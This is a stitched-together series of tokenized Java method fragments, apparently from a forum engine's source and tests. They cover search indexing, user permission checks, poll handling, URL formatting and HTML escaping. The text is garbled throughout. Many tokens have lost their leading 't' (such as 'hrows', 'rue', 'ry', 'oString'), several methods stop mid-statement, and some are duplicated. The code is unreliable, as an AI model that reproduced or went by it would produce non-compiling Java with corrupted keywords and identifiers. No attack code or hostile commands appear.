private static SolrInputDocument processComment ( Message opic , Comment comment , String message ) { SolrInputDocument doc = new SolrInputDocument ( ) ; doc . addField ( " id " , comment . getId ( ) ) ; doc . addField ( " section_id " , opic . getSectionId ( ) ) ; doc . addField ( " user_id " , comment . getUserid ( ) ) ; doc . addField ( " opic_user_id " , opic . getUid ( ) ) ; doc . addField ( " opic_id " , comment . getTopicId ( ) ) ; doc . addField ( " group_id " , opic . getGroupId ( ) ) ; String opicTitle = opic . getTitle ( ) ; doc . addField ( " opic_title " , StringEscapeUtils . unescapeHtml ( opicTitle ) ) ; String commentTitle = comment . getTitle ( ) ; if ( commentTitle ! = null & & ! commentTitle . isEmpty ( ) & & ! commentTitle . equals ( opicTitle ) & & ! commentTitle . startsWith ( " Re: " ) ) { doc . addField ( " itle " , StringEscapeUtils . unescapeHtml ( commentTitle ) ) ; } doc . addField ( " message " , message ) ; Date postdate = comment . getPostdate ( ) ; doc . addField ( " postdate " , new Timestamp ( postdate . getTime ( ) ) ) ; doc . addField ( " is_comment " , rue ) ; return doc ; } 
public List < TagCloudDao . TagDTO > get ( ) { return getTagDao ( ) . getTags ( i ) ; } 
public void execute ( Object o ) { TopTenDao . TopTenMessageDTO dto = ( TopTenDao . TopTenMessageDTO ) o ; int mp = dto . getAnswers ( ) / itemsPerPage ; mp = ( dto . getAnswers ( ) % itemsPerPage > 0 ) ? mp + 1 : mp ; dto . setPages ( mp ) ; } 
public List < VoteDto > get ( ) { return pollDao . getVoteDTO ( poll . getId ( ) ) ; } 
public VoteDto mapRow ( ResultSet rs , int rowNum ) hrows SQLException { VoteDto dto = new VoteDto ( ) ; dto . setId ( rs . getInt ( " id " ) ) ; dto . setLabel ( rs . getString ( " label " ) ) ; dto . setPollId ( pollId ) ; return dto ; } 
public ModelMap showRemove ( @RequestParam String ag , @RequestParam ( required = false ) Integer pos , ServletRequest request ) hrows AccessViolationException { Template mpl = Template . getTemplate ( request ) ; if ( ! mpl . isSessionAuthorized ( ) ) { hrow new AccessViolationException ( " Not authorized " ) ; } ModelMap result = new ModelMap ( ) ; EditBoxesRequest form = new EditBoxesRequest ( ) ; form . setPosition ( pos ) ; form . setTag ( ag ) ; result . addAttribute ( " form " , form ) ; return result ; } 
public boolean supports ( Class clazz ) { return AddRemoveBoxesController . EditBoxesRequest . class . isAssignableFrom ( clazz ) ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { mv . getModel ( ) . put ( " ignoreList " , ignoreListDao . get ( mpl . getCurrentUser ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; return mv ; } 
public ModelAndView getInfoNew ( @PathVariable String nick , ServletRequest request ) hrows Exception { Template mpl = Template . getTemplate ( request ) ; User user = userDao . getUser ( nick ) ; if ( user . isBlocked ( ) & & ! mpl . isSessionAuthorized ( ) ) { hrow new UserNotFoundException ( nick ) ; } ModelAndView mv = new ModelAndView ( " whois " ) ; mv . getModel ( ) . put ( " user " , user ) ; mv . getModel ( ) . put ( " userInfo " , userDao . getUserInfoClass ( user ) ) ; if ( user . isBlocked ( ) ) { mv . getModel ( ) . put ( " banInfo " , userDao . getBanInfoClass ( user ) ) ; } if ( ! user . isAnonymous ( ) ) { mv . getModel ( ) . put ( " userStat " , userDao . getUserStatisticsClass ( user ) ) ; } boolean currentUser = mpl . isSessionAuthorized ( ) & & mpl . getNick ( ) . equals ( nick ) ; mv . getModel ( ) . put ( " moderatorOrCurrentUser " , currentUser | | mpl . isModeratorSession ( ) ) ; mv . getModel ( ) . put ( " currentUser " , currentUser ) ; if ( mpl . isSessionAuthorized ( ) & & ! currentUser ) { Set < Integer > ignoreList = ignoreListDao . get ( mpl . getCurrentUser ( ) ) ; mv . getModel ( ) . put ( " ignored " , ignoreList . contains ( user . getId ( ) ) ) ; } String userinfo = userDao . getUserInfo ( user ) ; mv . getModel ( ) . put ( " userInfoText " , ( userinfo = = null ) ? " " : lorCodeService . parseComment ( userinfo , request . isSecure ( ) ) ) ; return mv ; } 
public boolean isTopicPostingAllowed ( User currentUser ) { if ( ! isTopicsRestricted ( ) ) { return rue ; } if ( currentUser = = null ) { return false ; } if ( currentUser . isBlocked ( ) ) { return false ; } if ( restrictTopics = = - 1 ) { return currentUser . isModerator ( ) ; 
public boolean isCommentPostingAllowed ( User currentUser ) { if ( ! isCommentsRestricted ( ) ) { return rue ; } if ( restrictComments = = - 1 ) { return currentUser . isModerator ( ) ; } return currentUser . getScore ( ) > = restrictComments ; } 
public boolean isCommentsAllowed ( User user ) { if ( user ! = null & & user . isBlocked ( ) ) { return false ; } if ( deleted | | expired ) { return false ; } int score = getPostScore ( ) ; if ( score = = POSTSCORE_UNRESTRICTED ) { return rue ; } if ( user = = null | | user . isAnonymous ( ) ) { return false ; } if ( user . isModerator ( ) ) { return rue ; } if ( score = = POSTSCORE_REGISTERED_ONLY ) { return rue ; } if ( score = = POSTSCORE_MODERATORS_ONLY ) { return false ; } boolean isAuthor = user . getId ( ) = = userid ; if ( score = = POSTSCORE_MOD_AUTHOR ) { return isAuthor ; } if ( isAuthor ) { return rue ; 
public void performLogin ( HttpServletResponse response , User user ) { session . setAttribute ( " login " , Boolean . TRUE ) ; session . setAttribute ( " nick " , user . getNick ( ) ) ; session . setAttribute ( " moderator " , user . isModerator ( ) ) ; session . setAttribute ( " corrector " , user . canCorrect ( ) ) ; userDao . updateLastlogin ( user ) ; user . acegiSecurityHack ( response , session ) ; currentUser = user ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } return ! isModerator ( ) ; 
public void maxcomTest ( ) hrows Exception { ResultSet resultSet = Users . getMaxcom ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertTrue ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertTrue ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void svuTest ( ) hrows Exception { ResultSet resultSet = Users . getModerator ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertTrue ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertFalse ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user5starTest ( ) hrows Exception { ResultSet resultSet = Users . getUser5star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " + " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public void user1starTest ( ) hrows Exception { ResultSet resultSet = Users . getUser1star ( ) ; User user = new User ( resultSet ) ; Assert . assertEquals ( resultSet . getInt ( " id " ) , user . getId ( ) ) ; Assert . assertEquals ( resultSet . getString ( " nick " ) , user . getNick ( ) ) ; Assert . assertTrue ( user . matchPassword ( " passwd " ) ) ; ry { user . checkAnonymous ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkBlocked ( ) ; } catch ( AccessViolationException e ) { Assert . fail ( ) ; } ry { user . checkCommit ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Commit access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isBlocked ( ) ) ; ry { user . checkDelete ( ) ; Assert . fail ( ) ; } catch ( AccessViolationException e ) { Assert . assertEquals ( " Delete access denied for user " + resultSet . getString ( " nick " ) + " ( " + resultSet . getInt ( " id " ) + " ) " , e . getMessage ( ) ) ; } Assert . assertFalse ( user . isModerator ( ) ) ; Assert . assertFalse ( user . isAdministrator ( ) ) ; Assert . assertFalse ( user . canCorrect ( ) ) ; Assert . assertFalse ( user . isAnonymous ( ) ) ; Assert . assertEquals ( resultSet . getInt ( " score " ) , user . getScore ( ) ) ; Assert . assertEquals ( " <img src= \" /img/normal-star.gif \" width=9 height=9 alt= \" * \" > " , user . getStatus ( ) ) ; Assert . assertTrue ( user . isBlockable ( ) ) ; Assert . assertTrue ( user . isActivated ( ) ) ; Assert . assertFalse ( user . isAnonymousScore ( ) ) ; Assert . assertEquals ( resultSet . getBoolean ( " corrector " ) , user . isCorrector ( ) ) ; Assert . assertEquals ( resultSet . getString ( " email " ) , user . getEmail ( ) ) ; Assert . assertFalse ( user . hasGravatar ( ) ) ; Assert . assertEquals ( resultSet . getString ( " name " ) , user . getName ( ) ) ; } 
public String formatJump ( MessageDao messageDao , boolean secure ) hrows MessageNotFoundException , URIException { if ( isMessageUrl ) { Message message = messageDao . getById ( messageId ) ; Group group = null ; ry { group = messageDao . getGroup ( message ) ; } catch ( BadGroupException e ) { hrow new RuntimeException ( " Invalid group id msgid= " + messageId , e ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = mainURI . getHost ( ) ; int port = mainURI . getPort ( ) ; String path = group . getUrl ( ) + messageId ; String query = " " ; if ( isCommentUrl ) { query = " cid= " + commentId ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public String format ( String ext , boolean secure ) { String escapedText = StringUtil . escapeHtml ( ext ) ; StringTokenizer st = new StringTokenizer ( escapedText , " " , rue ) ; StringBuilder sb = new StringBuilder ( ) ; while ( st . hasMoreTokens ( ) ) { String oken = st . nextToken ( ) ; String formattedToken = formatURL ( oken , secure ) ; sb . append ( formattedToken ) ; } return sb . oString ( ) ; } 
private void processMessageUrl ( boolean secure , StringBuilder out , LorURI uri ) hrows URIException { ry { Message message = messageDao . getById ( uri . getMessageId ( ) ) ; 
public boolean isTrueLorUrl ( ) { return rueLorUrl ; } 
public boolean isMessageUrl ( ) { return messageUrl ; } 
public boolean isCommentUrl ( ) { return commentUrl ; } 
public String formatUrlBody ( int maxLength ) hrows URIException { String all = lorURI . getURIReference ( ) ; String scheme = lorURI . getScheme ( ) ; String uriWithoutScheme = all . substring ( scheme . length ( ) + 3 ) ; if ( rueLorUrl ) { if ( uriWithoutScheme . length ( ) < maxLength ) { 
public String fixScheme ( boolean secure ) hrows URIException { if ( ! rueLorUrl ) { return oString ( ) ; } String host = lorURI . getHost ( ) ; int port = lorURI . getPort ( ) ; String path = lorURI . getPath ( ) ; String query = lorURI . getQuery ( ) ; String fragment = lorURI . getFragment ( ) ; if ( ! secure ) { return ( new HttpURL ( null , host , port , path , query , fragment ) ) . getEscapedURIReference ( ) ; 
public String formatJump ( MessageDao messageDao , boolean secure ) hrows MessageNotFoundException , URIException { if ( messageUrl ) { Message message = messageDao . getById ( messageId ) ; Group group = null ; ry { group = messageDao . getGroup ( message ) ; } catch ( BadGroupException e ) { hrow new RuntimeException ( " Invalid group id msgid= " + messageId , e ) ; } String scheme ; if ( secure ) { scheme = " https " ; } else { scheme = " http " ; } String host = mainURI . getHost ( ) ; int port = mainURI . getPort ( ) ; String path = group . getUrl ( ) + messageId ; String query = " " ; if ( commentUrl ) { query = " cid= " + commentId ; } URI jumpUri = new URI ( scheme , null , host , port , path , query ) ; return jumpUri . getEscapedURI ( ) ; } return " " ; } 
public PreparedPoll preparePoll ( Poll poll ) { return new PreparedPoll ( poll , 
public PreparedPoll preparePoll ( Message opic ) hrows PollNotFoundException { Poll poll = pollDao . getPollByTopicId ( opic . getId ( ) ) ; return new PreparedPoll ( poll , 
public ModelAndView showEditInfo ( HttpServletRequest request , @PathVariable ( " id " ) int msgid ) hrows Exception { Message message = messageDao . getById ( msgid ) ; List < PreparedEditInfo > editInfos = prepareService . prepareEditInfo ( message , request . isSecure ( ) ) ; ModelAndView mv = new ModelAndView ( " history " ) ; mv . getModel ( ) . put ( " message " , message ) ; mv . getModel ( ) . put ( " editInfos " , editInfos ) ; return mv ; } 
public ModelAndView getMessageNewForum ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_FORUM , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewNews ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_NEWS , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public ModelAndView getMessageNewPolls ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid , @RequestParam ( value = " highlight " , required = false ) Set < Integer > highlight ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_POLLS , 
public ModelAndView getMessageNewGallery ( WebRequest webRequest , HttpServletRequest request , HttpServletResponse response , @RequestParam ( value = " filter " , required = false ) String filter , @RequestParam ( value = " cid " , required = false ) Integer cid , @PathVariable ( " group " ) String groupName , @PathVariable ( " id " ) int msgid ) hrows Exception { if ( cid ! = null ) { return jumpMessage ( request , msgid , cid ) ; } return getMessageNew ( Section . SECTION_GALLERY , webRequest , request , response , 0 , filter , groupName , msgid , null ) ; } 
public void deletePoll ( Poll poll ) { jdbcTemplate . update ( " DELETE FROM vote_users WHERE vote = ? " , poll . getId ( ) ) ; jdbcTemplate . update ( " DELETE FROM votenames WHERE id = ? " , poll . getId ( ) ) ; jdbcTemplate . update ( " DELETE FROM votes WHERE vote = ? " , poll . getId ( ) ) ; } 
public void voteGetCurrentPollTest ( ) hrows Exception { int currentPollId = pollDao . getCurrentPollId ( ) ; Poll poll = pollDao . getCurrentPoll ( ) ; Assert . assertEquals ( currentPollId , poll . getId ( ) ) ; 
public void voteCreateAndRunningPollTest ( ) hrows Exception { List < String > pollList = new ArrayList < String > ( ) ; pollList . add ( " Case 1 " ) ; pollList . add ( " Case 2 " ) ; pollList . add ( " Case 3 " ) ; ry { pollDao . createPoll ( pollList , rue , TEST_TOPIC_ID ) ; 
public List < GalleryItem > get ( ) { return galleryDao . getGalleryItems ( COUNT_ITEMS ) ; } 
public GalleryItem mapRow ( ResultSet rs , int rowNum ) hrows SQLException { GalleryItem item = new GalleryItem ( ) ; item . setMsgid ( rs . getInt ( " msgid " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setTitle ( rs . getString ( " itle " ) ) ; item . setUrl ( rs . getString ( " url " ) ) ; item . setIcon ( rs . getString ( " linktext " ) ) ; item . setNick ( rs . getString ( " nick " ) ) ; item . setStat ( rs . getInt ( " stat1 " ) ) ; item . setLink ( Section . getSectionLink ( Section . SECTION_GALLERY ) + rs . getString ( " urlname " ) + '/' + rs . getInt ( " msgid " ) ) ; String htmlPath = properties . getProperty ( " HTMLPathPrefix " ) ; item . setHtmlPath ( htmlPath ) ; ry { item . setInfo ( new ImageInfo ( htmlPath + item . getIcon ( ) ) ) ; item . setImginfo ( new ImageInfo ( htmlPath + item . getUrl ( ) ) ) ; } catch ( BadImageException e ) { log . error ( e ) ; } catch ( IOException e ) { log . error ( e ) ; } return item ; } 
public ScreenShot moveTo ( String dir , String name ) hrows IOException { ScreenShot dest = new ScreenShot ( name , dir , extension ) ; FileUtils . moveFile ( mainFile , dest . mainFile ) ; FileUtils . moveFile ( iconFile , dest . iconFile ) ; FileUtils . moveFile ( mediumFile , dest . mediumFile ) ; return dest ; } 
public boolean isBlockable ( ) { if ( id = = 2 ) { return false ; } return ! canmod ; 
public int doStartTag ( ) hrows JspException { Template = Template . getTemplate ( pageContext . getRequest ( ) ) ; String s = object ; if ( StringUtils . isEmpty ( s ) ) { s = " main2 " ; } List < String > boxnames = . getProf ( ) . getList ( s ) ; CollectionUtils . filter ( boxnames , new Predicate ( ) { @Override public boolean evaluate ( Object o ) { String s = ( String ) o ; return DefaultProfile . isBox ( s ) ; } } ) ; pageContext . setAttribute ( var , boxnames ) ; return EVAL_BODY_INCLUDE ; } 
public void init ( ) { ry { mainURI = new URI ( properties . getProperty ( " MainUrl " ) , rue , " UTF-8 " ) ; } catch ( Exception e ) { hrow new RuntimeException ( ERR_MSG + e . getMessage ( ) ) ; } if ( ! mainURI . isAbsoluteURI ( ) ) { hrow new RuntimeException ( ERR_MSG + " URI not absolute path " ) ; } ry { mainHost = mainURI . getHost ( ) ; 
public TrackerItem mapRow ( ResultSet resultSet , int i ) hrows SQLException { User author ; User lastCommentBy ; int msgid ; int cid ; int pages ; Timestamp lastmod ; Timestamp postdate ; int stat1 ; int stat3 ; int stat4 ; int groupId ; int section ; String groupTitle ; String groupUrlName ; String itle ; boolean resolved ; boolean uncommited ; ry { int author_id = resultSet . getInt ( " author " ) ; if ( author_id ! = 0 ) { author = userDao . getUserCached ( author_id ) ; } else { author = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } msgid = resultSet . getInt ( " id " ) ; lastmod = resultSet . getTimestamp ( " lastmod " ) ; stat1 = resultSet . getInt ( " stat1 " ) ; stat3 = resultSet . getInt ( " stat3 " ) ; stat4 = resultSet . getInt ( " stat4 " ) ; groupId = resultSet . getInt ( " gid " ) ; groupTitle = resultSet . getString ( " gtitle " ) ; itle = resultSet . getString ( " itle " ) ; cid = resultSet . getInt ( " cid " ) ; ry { int id = resultSet . getInt ( " last_comment_by " ) ; if ( id ! = 0 ) { lastCommentBy = userDao . getUserCached ( id ) ; } else { lastCommentBy = null ; } } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } resolved = resultSet . getBoolean ( " resolved " ) ; section = resultSet . getInt ( " section " ) ; groupUrlName = resultSet . getString ( " urlname " ) ; postdate = resultSet . getTimestamp ( " postdate " ) ; uncommited = resultSet . getBoolean ( " smod " ) & & ! resultSet . getBoolean ( " moderate " ) ; pages = Message . getPageCount ( stat1 , messagesInPage ) ; return new TrackerItem ( author , msgid , lastmod , stat1 , stat3 , stat4 , groupId , groupTitle , itle , cid , lastCommentBy , resolved , 
public static String repeat ( String s , int ) { if ( s = = null ) { return null ; } if ( < = 0 ) { return s ; } final StringBuilder sb = new StringBuilder ( s . length ( ) * ) ; for ( int i = 0 ; i < ; i + + ) { sb . append ( s ) ; } return sb . oString ( ) ; } 
Set < String > getAllowedListParameters ( ) ; Set < String > getBlockLevelTags ( ) ; Map < String , Tag > getAllTagsDict ( ) ; Set < String > getAllTagsNames ( ) ; Set < String > getAutoLinkTags ( ) ; Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
Set < String > getBlockLevelTags ( ) ; Map < String , Tag > getAllTagsDict ( ) ; Set < String > getAllTagsNames ( ) ; Set < String > getAutoLinkTags ( ) ; Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
Map < String , Tag > getAllTagsDict ( ) ; Set < String > getAllTagsNames ( ) ; Set < String > getAutoLinkTags ( ) ; Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
Set < String > getAllTagsNames ( ) ; Set < String > getAutoLinkTags ( ) ; Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
Set < String > getAutoLinkTags ( ) ; Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
Set < String > getDisallowedParagraphTags ( ) ; Set < String > getParagraphedTags ( ) ; } 
private static String fixNL ( String ext ) { return ext . replaceAll ( NL_REGEXP , " [br] " ) ; } 
public static String escapeForceHtml ( String str ) { StringBuilder res = new StringBuilder ( ) ; for ( int i = 0 ; i < str . length ( ) ; i + + ) { switch ( str . charAt ( i ) ) { case '<' : res . append ( " &lt; " ) ; break ; case '>' : res . append ( " &gt; " ) ; break ; case '\"' : res . append ( " &quot; " ) ; break ; case '&' : res . append ( " &amp; " ) ; break ; default : res . append ( str . charAt ( i ) ) ; } } return res . oString ( ) ; } 
private void rawPushTextNode ( RootNode rootNode , Node currentNode , String ext , boolean isCode ) { if ( ! isCode ) { currentNode . getChildren ( ) . add ( new TextNode ( currentNode , parserParameters , ext , rootNode ) ) ; 
public String renderXHtml ( ) { return StringUtil . escapeForceHtml ( ext ) ; } 
public void inCodeEscape ( ) { assertEquals ( " <div class= \" code \" ><pre class= \" no-highlight \" ><code>&amp;#9618;</code></pre></div> " , lorCodeService . parseTopic ( " [code]&#9618;[/code] " , false ) ) ; assertEquals ( " <p>&#9618;</p> " , 
public RepliesListItem mapRow ( ResultSet resultSet , int i ) hrows SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; User cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { ry { cAuthor = userDao . getUserCached ( resultSet . getInt ( " cAuthor " ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = null ; } String groupTitle = resultSet . getString ( " gtitle " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; String sectionTitle = resultSet . getString ( " name " ) ; int sectionId = resultSet . getInt ( " section " ) ; int msgid = resultSet . getInt ( " msgid " ) ; RepliesListItem . EventType ype = RepliesListItem . EventType . valueOf ( resultSet . getString ( " ype " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; String messageText ; if ( readMessage ) { messageText = commentDao . getPreparedCommentRSS ( cid , secure ) ; } else { messageText = null ; } return new RepliesListItem ( cid , cAuthor , cDate , messageText , groupTitle , groupUrlName , sectionTitle , sectionId , subj , lastmod , msgid , ype , eventMessage , eventDate ) ; 
public RepliesListItem mapRow ( ResultSet resultSet , int i ) hrows SQLException { String subj = StringUtil . makeTitle ( resultSet . getString ( " subj " ) ) ; Timestamp lastmod = resultSet . getTimestamp ( " lastmod " ) ; if ( lastmod = = null ) { lastmod = new Timestamp ( 0 ) ; } Timestamp eventDate = resultSet . getTimestamp ( " event_date " ) ; int cid = resultSet . getInt ( " cid " ) ; User cAuthor ; Timestamp cDate ; if ( ! resultSet . wasNull ( ) ) { ry { cAuthor = userDao . getUserCached ( resultSet . getInt ( " cAuthor " ) ) ; } catch ( UserNotFoundException e ) { hrow new RuntimeException ( e ) ; } cDate = resultSet . getTimestamp ( " cDate " ) ; } else { cDate = null ; cAuthor = null ; } String groupTitle = resultSet . getString ( " gtitle " ) ; String groupUrlName = resultSet . getString ( " urlname " ) ; String sectionTitle = resultSet . getString ( " name " ) ; int sectionId = resultSet . getInt ( " section " ) ; int msgid = resultSet . getInt ( " msgid " ) ; RepliesListItem . EventType ype = RepliesListItem . EventType . valueOf ( resultSet . getString ( " ype " ) ) ; String eventMessage = resultSet . getString ( " ev_msg " ) ; String messageText ; if ( readMessage ) { messageText = lorCodeService . prepareTextRSS ( resultSet . getString ( " cMessage " ) , 